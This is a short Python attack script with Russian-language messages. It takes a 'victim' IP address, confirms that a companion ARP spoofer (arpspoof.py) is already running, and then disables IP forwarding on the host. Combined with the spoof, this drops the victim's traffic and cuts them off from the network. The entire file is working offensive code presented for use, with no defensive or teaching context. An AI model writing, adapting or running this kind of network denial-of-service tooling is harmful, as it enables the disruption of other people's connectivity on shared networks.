from sys import stdout
import scapy.all as scapy
import time
import argparse
import subprocess
import sys
import re

argparser = argparse.ArgumentParser()
argparser.add_argument("--target_ip", help="IP жертвы")
args = argparser.parse_args()

target_ip = args.target_ip

subprocess_output = subprocess.check_output("ps ax | grep arpspoof.py", shell=True).decode(sys.stdout.encoding)
process = re.findall(r"arpspoof.py", subprocess_output)

if len(process) < 3:
        print("Сначала запустите спуфер!")
        exit(1)

subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)


